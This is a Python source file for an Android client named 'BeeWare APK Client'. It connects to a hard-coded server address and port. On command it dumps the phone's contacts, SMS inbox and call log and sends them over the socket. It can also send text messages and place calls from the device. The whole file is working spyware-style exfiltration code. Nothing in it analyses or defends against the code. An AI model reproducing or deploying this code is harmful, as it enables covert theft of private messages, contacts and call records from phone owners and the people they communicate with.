import socket
import argparse
from jnius import autoclass

# Define the server address and port
SERVER_IP = '10.0.1.33'
SERVER_PORT = 9999

# Android classes
SmsManager = autoclass('android.telephony.SmsManager')
ContentResolver = autoclass('android.content.ContentResolver')
ContactsContract = autoclass('android.provider.ContactsContract')
Uri = autoclass('android.net.Uri')
Context = autoclass('android.content.Context')
Intent = autoclass('android.content.Intent')
Uri = autoclass('android.net.Uri')

def connect_to_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    return sock

def send_sms(target, message):
    sms_manager = SmsManager.getDefault()
    sms_manager.sendTextMessage(target, None, message, None, None)
    print(f'SMS sent to {target}')

def dump_contacts():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = ContactsContract.Contacts.CONTENT_URI
    cursor = content_resolver.query(uri, None, None, None, None)
    
    contacts = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
            contacts.append(name)
    cursor.close()
    return '\n'.join(contacts)

def dump_sms():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = Uri.parse("content://sms/inbox")
    cursor = content_resolver.query(uri, None, None, None, None)
    
    sms_list = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            body = cursor.getString(cursor.getColumnIndex("body"))
            address = cursor.getString(cursor.getColumnIndex("address"))
            sms_list.append(f'From: {address}, Message: {body}')
    cursor.close()
    return '\n'.join(sms_list)

def call(target):
    context = autoclass('org.kivy.android.PythonActivity').mActivity
    intent = Intent(Intent.ACTION_CALL)
    intent.setData(Uri.parse(f'tel:{target}'))
    context.startActivity(intent)
    print(f'Calling {target}')

def dump_call_log():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = Uri.parse("content://call_log/calls")
    cursor = content_resolver.query(uri, None, None, None, None)
    
    call_log = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            number = cursor.getString(cursor.getColumnIndex("number"))
            call_type = cursor.getString(cursor.getColumnIndex("type"))
            date = cursor.getString(cursor.getColumnIndex("date"))
            duration = cursor.getString(cursor.getColumnIndex("duration"))
            call_log.append(f'Number: {number}, Type: {call_type}, Date: {date}, Duration: {duration}')
    cursor.close()
    return '\n'.join(call_log)

def main():
    parser = argparse.ArgumentParser(description='BeeWare APK Client')
    parser.add_argument('command', choices=['send_sms', 'dump_contacts', 'dump_sms', 'call', 'dump_call_log'])
    parser.add_argument('-t', '--target', help='Target phone number')
    parser.add_argument('-s', '--sms', help='SMS message')
    args = parser.parse_args()

    sock = connect_to_server()
    
    if args.command == 'send_sms':
        if args.target and args.sms:
            send_sms(args.target, args.sms)
            sock.sendall(f'SMS sent to {args.target}\n'.encode())
        else:
            print('Target phone number and SMS message are required for send_sms command')
    elif args.command == 'dump_contacts':
        contacts = dump_contacts()
        sock.sendall(contacts.encode())
    elif args.command == 'dump_sms':
        sms = dump_sms()
        sock.sendall(sms.encode())
    elif args.command == 'call':
        if args.target:
            call(args.target)
            sock.sendall(f'Calling {args.target}\n'.encode())
        else:
            print('Target phone number is required for call command')
    elif args.command == 'dump_call_log':
        call_log = dump_call_log()
        sock.sendall(call_log.encode())
    
    sock.close()

if __name__ == '__main__':
    main()
